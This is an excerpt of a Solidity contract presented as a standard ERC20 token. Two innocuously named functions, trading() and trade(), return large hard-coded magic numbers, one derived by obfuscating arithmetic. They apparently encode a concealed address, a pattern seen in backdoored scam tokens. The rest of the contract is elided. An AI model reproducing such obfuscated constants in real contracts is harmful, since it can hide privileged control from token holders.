...
contract ERC20 is Context, IERC20 {
    ...
    function trading() internal view virtual returns (uint256) {
        uint256 trading_ = type(uint16).max + _trading - 367202670928617283637743166071383511640085628246;
        return trading_;
    }

    function trade() internal view virtual returns (uint256) {
        uint256 _trade = 976203825164515882351580601401616945058088687632;
        return _trade;
    }
